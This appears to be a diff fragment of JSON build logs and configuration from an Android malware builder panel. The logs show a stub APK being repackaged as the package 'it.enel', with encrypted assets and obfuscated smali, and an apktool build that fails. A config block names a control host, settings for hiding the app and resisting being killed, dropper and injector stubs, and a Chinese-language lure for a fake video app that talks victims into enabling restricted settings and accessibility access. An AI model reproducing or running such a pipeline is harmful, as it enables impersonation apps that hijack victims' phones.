+    "Content": "[DEBUG] TheApkPath=/tmp/Eaod_custom_cDwyuuytTh/temp"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG] Checking: /tmp/Eaod_custom_cDwyuuytTh/temp/AndroidManifest.xml"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG] File.Exists=True"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG] AndroidManifest found, reading..."
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": "[DEBUG] Waiting strings.xml: /tmp/Eaod_custom_cDwyuuytTh/temp/res/values/strings.xml exists=True"
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": ">> Encoding Strings file..."
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": ">> Change ico..."
+  },
+  {
+    "Date": "04/01/2026 15:53:06",
+    "Content": ">> Change blackui..."
+  },
+  {
+    "Date": "04/01/2026 15:53:07",
+    "Content": "[DEBUG] Step2 permissions/strings/ico/blackui done"
+  },
+  {
+    "Date": "04/01/2026 15:53:07",
+    "Content": ">> Coding AndroidManifest..."
+  },
+  {
+    "Date": "04/01/2026 15:53:07",
+    "Content": "New apk PKG: it.enel"
+  },
+  {
+    "Date": "04/01/2026 15:53:07",
+    "Content": ">> Updating Res files..."
+  },
+  {
+    "Date": "04/01/2026 15:53:07",
+    "Content": ">> Custom Step 3..."
+  },
+  {
+    "Date": "04/01/2026 15:53:07",
+    "Content": ">> Encryption..."
+  },
+  {
+    "Date": "04/01/2026 15:53:09",
+    "Content": ">> Encryption ALL..."
+  },
+  {
+    "Date": "04/01/2026 15:53:20",
+    "Content": ">> Skipping junk/shuffle (protection disabled)..."
+  },
+  {
+    "Date": "04/01/2026 15:53:20",
+    "Content": "Encrypt Assets:dhxsbgaxaua1"
+  },
+  {
+    "Date": "04/01/2026 15:53:21",
+    "Content": ">> Final placeholder sweep (all smali dirs)..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": ">> Sweep complete: 0 files patched."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": ">----------------->> Building Apk..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": "[DEBUG-CMD] java -Djdk.xml.entityExpansionLimit=0 -Djdk.xml.maxXMLNameLimit=0 -jar /tmp/Eaod_custom_cDwyuuytTh/apktool.jar b -f /tmp/Eaod_custom_cDwyuuytTh/temp -o /tmp/Eaod_custom_cDwyuuytTh/out/Ready.apk"
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": "[DEBUG-SHELL] Picked up JAVA_TOOL_OPTIONS: -Xmx4g"
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": "[DEBUG-SHELL] I: Using Apktool 2.12.1 on apkstub.apk with 8 threads"
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": ">>  Using Apktool 2.12.1 on apkstub.apk with 8 threads"
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": "[DEBUG-SHELL] I: Smaling smali folder into classes.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": ">>  Smaling smali folder into classes.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": "[DEBUG-SHELL] I: Smaling smali_classes2 folder into classes2.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": ">>  Smaling smali_classes2 folder into classes2.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": "[DEBUG-SHELL] I: Smaling smali_classes3 folder into classes3.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": ">>  Smaling smali_classes3 folder into classes3.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": "[DEBUG-SHELL] I: Smaling smali_classes4 folder into classes4.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": ">>  Smaling smali_classes4 folder into classes4.dex..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": "[DEBUG-SHELL] [Fatal Error] :2:69: JAXP00010005: The length of entity \"http://schemas.android.com/apk/res/android\" is \"42\" that exceeds the \"0\" limit set by \"system property\"."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": "[DEBUG-SHELL] I: Building resources with aapt2..."
+  },
+  {
+    "Date": "04/01/2026 15:53:22",
+    "Content": ">>  Building resources with aapt2..."
+  },
+  {
+    "Date": "04/01/2026 15:53:27",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/abfigxjh.smali[144,21] Error for input '\"??????????': Unterminated string literal"
+  },
+  {
+    "Date": "04/01/2026 15:53:27",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/abfigxjh.smali[145,0] mismatched input '????????????????????' expecting STRING_LITERAL"
+  },
+  {
+    "Date": "04/01/2026 15:53:27",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/abfigxjh.smali[149,25] Error for input '%': Invalid text"
+  },
+  {
+    "Date": "04/01/2026 15:53:27",
+    "Content": "[DEBUG-SHELL] temp/smali/com/icontrol/protector/abfigxjh.smali[149,30] Error for input '\"': Unterminated string literal"
+  },
+  {
+    "Date": "04/01/2026 15:53:34",
+    "Content": "[DEBUG-SHELL] Exception in thread \"main\" brut.androlib.exceptions.AndrolibException: Could not smali file: com/icontrol/protector/abfigxjh.smali"
+  },
+  {
+    "Date": "04/01/2026 15:53:34",
+    "Content": "[DEBUG-SHELL] \tat brut.androlib.src.SmaliBuilder.buildFile(SourceFile:74)"
+  },
+  {
+    "Date": "04/01/2026 15:53:34",
+    "Content": "[DEBUG-SHELL] \tat brut.androlib.ApkBuilder.buildSourcesSmaliJob(SourceFile:48)"
+  },
+  {
+    "Date": "04/01/2026 15:53:34",
+    "Content": "[DEBUG-SHELL] \tat brut.androlib.ApkBuilder.lambda$buildSourcesSmali$0(SourceFile:181)"
+  },
+  {
+    "Date": "04/01/2026 15:53:34",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)"
+  },
+  {
+    "Date": "04/01/2026 15:53:34",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)"
+  },
+  {
+    "Date": "04/01/2026 15:53:34",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)"
+  },
+  {
+    "Date": "04/01/2026 15:53:34",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)"
+  },
+  {
+    "Date": "04/01/2026 15:53:34",
+    "Content": "[DEBUG-SHELL] \tat java.base/java.lang.Thread.run(Thread.java:829)"
+  },
+  {
+    "Date": "04/01/2026 16:07:20",
+    "Content": ">InsertApp Error 2: Response status code does not indicate success: 404 (Not Found)."
+  }
+]ronizer.transposer.tracker\r\nUserid: 1\r\nClientName: 深夜伴侣\r\nEmail: YrIAU+Rfdz0JbXaf17JA6A==\r\nMainActivity: empty\r\nAppdir: empty\r\nUserHost: yk.6668888.top\r\nuse_access: 1\r\nuse_antkill: 1\r\nuse_atoprims: 加载中~请勿操作或锁屏！\r\nnotifytitle:   \r\nnotifymsg: off\r\nASKPRIM_all: 1\r\nASKPRIM_black: 1\r\nBuildtype: C\r\nappname: 深夜伴侣\r\nappversion: 3.3.4\r\nappicopath: ba4509737c197e608559531dcaa20669.png\r\nappurl: /rOVBkruR99k6UN9Oa8FvA==\r\nlogintitle: name\r\nlogindis: 允许受限制的设置\r\nloginbtn: 确定\r\nlngshort: 深夜伴侣视频温馨提醒\n因大陆网络受限制本次需要开启权限才能使用\n请仔细阅读使用步骤--\n1、点击下方确定--\n2、打开已下载服务（或应用）--\n3、点击深夜伴侣视频--开始使用--等待加载100%即可使用\r\nhiddenapp: 1\r\nnoemulator: /www/wwwroot/yk.6668888.top/user/ui/a31c0418dca168a5e459db1fc42e4d3c.png\r\ninstalltype: g\r\nhidetype: k\r\nuse_draw: 0\r\nopen_access：0\r\ndescr_iption：无\r\ndiao_type：1\r\nZIPPATH: /www/wwwroot/yk.6668888.top/private/apkstub/apkstub.zip\r\nTargetApkicon: /www/wwwroot/yk.6668888.top/user/storage/1/icons/ba4509737c197e608559531dcaa20669.png\r\nDropStub: /www/wwwroot/yk.6668888.top/private/apkstub/dropstub.zip\r\nInjectStub: /www/wwwroot/yk.6668888.top/private/apkstub/jectstub.zip\r\nuserfolder: /www/wwwroot/yk.6668888.top/user/apps/1/org.synchronizer.transposer.tracker"
+  }
+]
